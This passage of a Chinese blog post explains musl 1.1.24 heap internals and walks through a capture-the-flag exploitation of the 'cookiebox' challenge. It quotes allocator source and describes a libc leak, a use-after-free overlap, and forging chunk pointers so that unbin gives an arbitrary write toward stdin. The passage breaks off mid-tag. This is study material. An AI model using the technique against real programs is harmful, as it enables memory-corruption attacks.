    <content type="html"><![CDATA[<p>早就该学musl pwn，之前学了一点又没学了，还是得学的</p><h2 id="1-musl-1-1-24"><a href="#1-musl-1-1-24" class="headerlink" title="1.musl 1.1.24"></a>1.musl 1.1.24</h2><h3 id="1-1-结构体"><a href="#1-1-结构体" class="headerlink" title="1.1 结构体"></a>1.1 结构体</h3><p>老版本的musl，其中涉及到的几个主要的结构体如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line"><span class="type">size_t</span> psize, csize;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>和ptmalloc的chunk类似，psize是前一个堆块的size，csize是当前堆块的size，next和prev分别指向前一个和后一个chunk，和ptmalloc不同的是，psize一直有效，而不止在前一个chunk处于free状态时有效。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bin</span> &#123;</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> lock[<span class="number">2</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">head</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">tail</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>head指向bin中的第一个chunk，tail指向bin中的最后一个chunk；第一个chunk的prev指向bin，最后一个chunk的next指向bin。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">uint64_t</span> binmap;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bin</span> <span class="title">bins</span>[64];</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> free_lock[<span class="number">2</span>];</span><br><span class="line">&#125; mal;</span><br></pre></td></tr></table></figure><p>mal结构体用于管理bin，binmap是一个64位的标志位，对应着64个bin，如果某个bin不为空，则binmap中的对应位则置1.</p><p>以上三个结构体由小到大，mal管理bin，bin管理chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_ALIGN (4*sizeof(size_t))</span></span><br></pre></td></tr></table></figure><p>64位字长下，chunk的size为0x20字节对齐</p><p>musl中存在一个静态堆区，优先从其中进行划分堆块</p><img src="https://pic.imgdb.cn/item/6502cc3c661c6c8e54f297b5.jpg" style="zoom:80%;" /><table><thead><tr><th align="center">bin 下标 i</th><th align="center">chunk 大小个数</th><th align="center">chunk 大小范围</th><th align="center">下标 i 与 chunk 大小范围的关系</th></tr></thead><tbody><tr><td align="center">0-31</td><td align="center">1</td><td align="center">0x20 – 0x400</td><td align="center">(i+1) * 0x20</td></tr><tr><td align="center">32-35</td><td align="center">8</td><td align="center">0x420 – 0x800</td><td align="center">(0x420+(i-32) <em>0x100) ~ (0x500+(i-32)</em> 0x100)</td></tr><tr><td align="center">36-39</td><td align="center">16</td><td align="center">0x820 – 0x1000</td><td align="center">(0x820+(i-36) <em>0x200) ~ (0x1000+(i-36)</em> 0x200)</td></tr><tr><td align="center">40-43</td><td align="center">32</td><td align="center">0x1020 – 0x2000</td><td align="center">(0x1020+(i-40) <em>0x400) ~ (0x1400+(i-40)</em> 0x400)</td></tr><tr><td align="center">44-47</td><td align="center">64</td><td align="center">0x2020 – 0x4000</td><td align="center">(0x2020+(i-44) <em>0x800) ~ (0x2800+(i-44)</em> 0x800)</td></tr><tr><td align="center">48-51</td><td align="center">128</td><td align="center">0x4020 – 0x8000</td><td align="center">(0x4020+(i-48) <em>0x1000) ~ (0x5000+(i-48)</em> 0x1000)</td></tr><tr><td align="center">52-55</td><td align="center">256</td><td align="center">0x8020 – 0x10000</td><td align="center">(0x8020+(i-52) <em>0x2000) ~ (0xa000+(i-52)</em> 0x2000)</td></tr><tr><td align="center">56-59</td><td align="center">512</td><td align="center">0x10020 – 0x20000</td><td align="center">(0x10020+(i-56) <em>0x4000) ~ (0x14000+(i-56)</em> 0x4000)</td></tr><tr><td align="center">60-62</td><td align="center">1024</td><td align="center">0x20020 – 0x38000</td><td align="center">(0x20020+(i-60) <em>0x8000) ~ (0x28000+(i-60)</em> 0x8000)</td></tr><tr><td align="center">63</td><td align="center">无限</td><td align="center">0x38000 以上</td><td align="center">0x38000 ~</td></tr></tbody></table><p>上面是每个 bin 的 chunk 大小范围，可以从源码中的<a href="https://github.com/bminor/musl/blob/v1.1.24/src/malloc/malloc.c#L96"><code>bin_index_up</code></a>推导出。前 32 个 bin 类似 fastbin 和 small bin，每个 bin 只对应一种大小的 chunk；后 32 个 bin 则类似 large bin，一个 bin 对应多种大小的 chunk。</p><h3 id="1-2-malloc"><a href="#1-2-malloc" class="headerlink" title="1.2 malloc"></a>1.2 malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">c</span>;</span></span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (adjust_size(&amp;n) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//进行0x20对齐</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (n &gt; MMAP_THRESHOLD) &#123; <span class="comment">//如果size大于mmap的阈值，则使用mmap进行分配</span></span><br><span class="line"><span class="type">size_t</span> len = n + OVERHEAD + PAGE_SIZE - <span class="number">1</span> &amp; -PAGE_SIZE;</span><br><span class="line"><span class="type">char</span> *base = __mmap(<span class="number">0</span>, len, PROT_READ|PROT_WRITE,</span><br><span class="line">MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (base == (<span class="type">void</span> *)<span class="number">-1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">c = (<span class="type">void</span> *)(base + SIZE_ALIGN - OVERHEAD);</span><br><span class="line">c-&gt;csize = len - (SIZE_ALIGN - OVERHEAD);</span><br><span class="line">c-&gt;psize = SIZE_ALIGN - OVERHEAD;</span><br><span class="line"><span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//不使用mmap分配</span></span><br><span class="line">i = bin_index_up(n); <span class="comment">//计算要申请的size对应的bin的序号</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="type">uint64_t</span> mask = mal.binmap &amp; -(<span class="number">1ULL</span>&lt;&lt;i);<span class="comment">//查看大于这个size的bin中是否有chunk</span></span><br><span class="line"><span class="keyword">if</span> (!mask) &#123;<span class="comment">//所有的bin都为空</span></span><br><span class="line">c = expand_heap(n);<span class="comment">//通过拓展堆进行分配</span></span><br><span class="line"><span class="keyword">if</span> (!c) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (alloc_rev(c)) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">x</span> =</span> c;</span><br><span class="line">c = PREV_CHUNK(c);</span><br><span class="line">NEXT_CHUNK(x)-&gt;psize = c-&gt;csize =</span><br><span class="line">x-&gt;csize + CHUNK_SIZE(c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">//找到符合条件的最小的bin</span></span><br><span class="line">j = first_set(mask);</span><br><span class="line">lock_bin(j);<span class="comment">//将bin锁住</span></span><br><span class="line">c = mal.bins[j].head;<span class="comment">//取得这个bin的第一个chunk</span></span><br><span class="line"><span class="keyword">if</span> (c != BIN_TO_CHUNK(j)) &#123;<span class="comment">//如果这个chunk不指向自己</span></span><br><span class="line"><span class="keyword">if</span> (!pretrim(c, n, i, j)) unbin(c, j); <span class="comment">//如果这个chunk不可切割，则直接从bin中取下来这个chunk</span></span><br><span class="line">unlock_bin(j);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">unlock_bin(j);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Now patch up in case we over-allocated */</span></span><br><span class="line">trim(c, n);<span class="comment">//回收c中大小超过n的部分</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">unbin</span><span class="params">(<span class="keyword">struct</span> chunk *c, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span>&lt;&lt;i));</span><br><span class="line">c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">c-&gt;next-&gt;prev = c-&gt;prev;<span class="comment">//双向链表解链</span></span><br><span class="line">c-&gt;csize |= C_INUSE;</span><br><span class="line">NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体步骤就是：</p><ol><li><p>调整n，增加头部的长度然后对齐32位</p></li><li><p>如果n&gt;MMAP_THRESHOLD，则使用mmap创建一块大小为n的内存返回</p></li><li><p>如果n&lt;&#x3D;MMAP_THRESHOLD，计算n对应的bin的i，查找binmap</p><p> 如果所有可用bin都为空，那么就扩展堆空间，生存一个新的chunk</p><p> 如果存在非空的bin，则大小最接近n的bin，将bin首部的chunk返回</p><p> 如果符号pretrime条件，使用pretrime分割</p><p> 否则使用unbin从链表中取出</p><p> 最后对chunk进行trim，返回给用户</p></li></ol><h3 id="1-3-free"><a href="#1-3-free" class="headerlink" title="1.3 free"></a>1.3 free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">self</span> =</span> MEM_TO_CHUNK(p); <span class="comment">//计算p的size</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_MMAPPED(self))</span><br><span class="line">unmap_chunk(self);</span><br><span class="line"><span class="keyword">else</span><span class="comment">//不使用mmap分配则调用__bin_chunk进行释放</span></span><br><span class="line">__bin_chunk(self);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __bin_chunk(<span class="keyword">struct</span> chunk *self)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span> =</span> NEXT_CHUNK(self);<span class="comment">//找到self物理相邻的下一个chunk</span></span><br><span class="line"><span class="type">size_t</span> final_size, new_size, size;</span><br><span class="line"><span class="type">int</span> reclaim=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">final_size = new_size = CHUNK_SIZE(self);<span class="comment">//计算self的真实size</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Crash on corrupted footer (likely from buffer overflow) */</span></span><br><span class="line"><span class="keyword">if</span> (next-&gt;psize != self-&gt;csize) a_crash();<span class="comment">//如果下一个chunk的psize不等于当前chunk的csize，crash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE) &#123;<span class="comment">//如果self的前一个chunk和next都处于使用状态</span></span><br><span class="line">self-&gt;csize = final_size | C_INUSE;</span><br><span class="line">next-&gt;psize = final_size | C_INUSE;</span><br><span class="line">i = bin_index(final_size);<span class="comment">//计算self的size属于哪个bin</span></span><br><span class="line">lock_bin(i);<span class="comment">//锁住这个bin</span></span><br><span class="line">lock(mal.free_lock);<span class="comment">//锁住mal的free_lock</span></span><br><span class="line"><span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE)</span><br><span class="line"><span class="keyword">break</span>;<span class="comment">//跳出循环</span></span><br><span class="line">unlock(mal.free_lock);</span><br><span class="line">unlock_bin(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//合并前一个free的chunk</span></span><br><span class="line"><span class="keyword">if</span> (alloc_rev(self)) &#123;<span class="comment">//alloc_rev将self的前一个chunk从bin中取下来</span></span><br><span class="line">self = PREV_CHUNK(self);</span><br><span class="line">size = CHUNK_SIZE(self);</span><br><span class="line">final_size += size;<span class="comment">//final_size变成self的前向size和self之和</span></span><br><span class="line"><span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">reclaim = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//合并后一个free的chunk</span></span><br><span class="line"><span class="keyword">if</span> (alloc_fwd(next)) &#123;</span><br><span class="line">size = CHUNK_SIZE(next);</span><br><span class="line">final_size += size;</span><br><span class="line"><span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">reclaim = <span class="number">1</span>;</span><br><span class="line">next = NEXT_CHUNK(next);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在binmap中将bin[i]设置为非空</span></span><br><span class="line"><span class="keyword">if</span> (!(mal.binmap &amp; <span class="number">1ULL</span>&lt;&lt;i))</span><br><span class="line">a_or_64(&amp;mal.binmap, <span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line"></span><br><span class="line">self-&gt;csize = final_size;<span class="comment">//将self的csize设置为合并完之后的final_size</span></span><br><span class="line">next-&gt;psize = final_size;<span class="comment">//将next的psize设置为合并完之后的final_size</span></span><br><span class="line">unlock(mal.free_lock);</span><br><span class="line"></span><br><span class="line">self-&gt;next = BIN_TO_CHUNK(i);</span><br><span class="line">self-&gt;prev = mal.bins[i].tail;</span><br><span class="line">self-&gt;next-&gt;prev = self;</span><br><span class="line">self-&gt;prev-&gt;next = self;<span class="comment">//双向链表插入，将self插入到bin尾部</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Replace middle of large chunks with fresh zero pages */</span></span><br><span class="line"><span class="keyword">if</span> (reclaim) &#123;</span><br><span class="line"><span class="type">uintptr_t</span> a = (<span class="type">uintptr_t</span>)self + SIZE_ALIGN+PAGE_SIZE<span class="number">-1</span> &amp; -PAGE_SIZE;</span><br><span class="line"><span class="type">uintptr_t</span> b = (<span class="type">uintptr_t</span>)next - SIZE_ALIGN &amp; -PAGE_SIZE;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line">__madvise((<span class="type">void</span> *)a, b-a, MADV_DONTNEED);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">__mmap((<span class="type">void</span> *)a, b-a, PROT_READ|PROT_WRITE,</span><br><span class="line">MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unlock_bin(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_rev</span><span class="params">(<span class="keyword">struct</span> chunk *c)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">size_t</span> k;</span><br><span class="line"><span class="keyword">while</span> (!((k=c-&gt;psize) &amp; C_INUSE)) &#123;<span class="comment">//如果c的前一个chunk处于free状态</span></span><br><span class="line">i = bin_index(k);<span class="comment">//找到其对应的bin</span></span><br><span class="line">lock_bin(i);</span><br><span class="line"><span class="keyword">if</span> (c-&gt;psize == k) &#123;</span><br><span class="line">unbin(PREV_CHUNK(c), i);<span class="comment">//将c的前一个chunk从bin[i]中取出</span></span><br><span class="line">unlock_bin(i);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">unlock_bin(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__bin_chunk就是将chunk以及其前后的空闲chunk进行合并，然后加入到对应的bin中，再将binmap标志位进行设置。</p><p>链表的插入方式是FIFO</p><h3 id="1-4利用"><a href="#1-4利用" class="headerlink" title="1.4利用"></a>1.4利用</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">unbin</span><span class="params">(<span class="keyword">struct</span> chunk *c, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span>&lt;&lt;i));</span><br><span class="line">c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">c-&gt;next-&gt;prev = c-&gt;prev;<span class="comment">//双向链表解链</span></span><br><span class="line">c-&gt;csize |= C_INUSE;</span><br><span class="line">NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在进行unbin的时候没有检查指针合法性，在这里很容易被利用。</p><h4 id="1-4-1-羊城杯2023-cookiebox"><a href="#1-4-1-羊城杯2023-cookiebox" class="headerlink" title="1.4.1 羊城杯2023 cookiebox"></a>1.4.1 羊城杯2023 cookiebox</h4><img src="https://pic.imgdb.cn/item/6503052a661c6c8e54113fcc.jpg" style="zoom:50%;" /><p>增删查改四个功能</p><p><img src="https://pic.imgdb.cn/item/65030551661c6c8e54116a59.jpg"></p><p>漏洞在dele功能中，一个UAF</p><p>首先来泄露libc地址，由于存在静态堆区域，所以直接申请一个chunk，然后show就可以得到libc地址。</p><p>然后我们利用UAF修改一个chunk的fd和bk为stdin，再利用unbin就能够将stdin的地址放入bin中，后续就可以申请到stdin处的内存了</p><p>为了方便理解，我们对每一个步骤的堆块链表作图</p><p>初始情况下，bin的情况如下</p><p><img src="https://pic.imgdb.cn/item/65030f3b661c6c8e54179932.jpg"></p><p><img src="https://pic.imgdb.cn/item/65031224661c6c8e541953b7.png"></p><p>接下来，我们申请一块0x100的chunk，就会从bin-&gt;head中进行切割</p><p><img src="https://pic.imgdb.cn/item/650312ac661c6c8e541994f6.jpg"></p><p><img src="https://pic.imgdb.cn/item/65031347661c6c8e5419e8f9.png"></p><p>可以看到原本的第二个chunk成了chunk头，这是因为在malloc的过程中会先将原本的bin-&gt;head取出来，然后进行切割，再将剩余的chunk放回去。在这个chunk0中我们可以完成libc地址的泄露。</p><p>接着我们再申请两个chunk，根据上图可以推测，下面申请的两个chunk将分别从0x00007ffff7e953b0和0x602310进行切割</p><p>这是申请1个之后</p><p><img src="https://pic.imgdb.cn/item/65031571661c6c8e541c3f53.jpg"></p><p>从0x00007ffff7e953b0中切割了0x100之后，剩余的大小已经和0x602310不属于同一个bin了，剩余部分被存入到bin[37]，而0x602310被存在bin[38]，此时bin[37]和bin[38]各存在一个chunk。</p><p>申请2个之后</p><p><img src="https://pic.imgdb.cn/item/6503165f661c6c8e541c665d.jpg"></p><p>由于malloc会从符合大小的最小的bin中取出chunk进行切割，所以此后的所有malloc都不会再使用0x602310这个chunk。此次malloc从bin[37]的chunk中进行切割，切割完0x120之后，将剩余的chunk放入bin[36]中，而bin[37]实际上是空链表，其head和tail都指向自己。</p><p><img src="https://pic.imgdb.cn/item/65031723661c6c8e541d2651.jpg"></p><p>由于dele会清空对应chunk的num导致无法edit，所以我们需要构造出堆块复用来进行UAF。本次申请的两个chunk分别为chunk1和chunk2.</p><p>首先dele chunk1</p><p><img src="https://pic.imgdb.cn/item/65031903661c6c8e541e0154.jpg"></p><p>chunk1大小为0x120，会被放到bin[8]中，然后我们再把这个0x100的chunk申请回来，为chunk3，bin[8]会被清空</p><p><img src="https://pic.imgdb.cn/item/650319c4661c6c8e541ea47e.jpg"></p><p>这样一来chunk1和chunk3就指向了同一块chunk，接着dele chunk1，就可以通过操纵chunk3来修改chunk1的fd和bk了</p><p>此时的bin[8]如下图所示</p><p><img src="https://pic.imgdb.cn/item/65031d22661c6c8e54209e28.png"></p><p>如果此时我们修改了第一个chunk的fd和bk指针，再将这个chunk从bin中取出时触发unbin就可以构造出任意地址写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">c-&gt;next-&gt;prev = c-&gt;prev;</span><br></pre></td></tr></table></figure><p>将next指针修改为我们想要写入的值，将prev指针修改为想要写入的地址，在这里我们将next指针修改为stdin-0x10，将prev修改为0x602060，如下图</p><p><img src="https://pic.imgdb.cn/item/6503c323661c6c8e54525ac6.png"></p><p>经过unbin之后，就会变成如下图所示</p><p><a href="https://imgse.com/i/pPWJ0f0"><img src="https://z1.ax1x.com/2023/09/15/pPWJ0f0.png" alt="pPWJ0f0.png"></a></p><p>0x602060的next指针将会被写入stdin-0x10，next指针位于chunk结构体的0x10偏移处</p><p><img src="https://pic.imgdb.cn/item/6503c610661c6c8e545362d3.jpg"></p><p>如此一来我们编辑chunk2就能够修改stdin的内容。</p><p>下面介绍以下利用方法，musl中的FILE结构体和glibc的有所差别</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line"><span class="type">int</span> (*close)(FILE *);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line"><span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line"><span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line"><span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line"><span class="type">size_t</span> buf_size;</span><br><span class="line">FILE *prev, *next;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">int</span> pipe_pid;</span><br><span class="line"><span class="type">long</span> lockcount;</span><br><span class="line"><span class="type">int</span> mode;</span><br><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line"><span class="type">int</span> lbf;</span><br><span class="line"><span class="type">void</span> *cookie;</span><br><span class="line"><span class="type">off_t</span> off;</span><br><span class="line"><span class="type">char</span> *getln_buf;</span><br><span class="line"><span class="type">void</span> *mustbezero_2;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line"><span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">FILE *prev_locked, *next_locked;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>musl的FILE结构体是没有vtable这个虚表的，其中有四个函数指针：close，read，write，seek。</p><p>musl中的exit函数源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">_Noreturn</span> <span class="type">void</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> code)</span></span><br><span class="line">&#123;</span><br><span class="line">__funcs_on_exit();</span><br><span class="line">__libc_exit_fini();</span><br><span class="line">__stdio_exit();</span><br><span class="line">_Exit(code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__stdio_exit如下</p><figure class="highlight 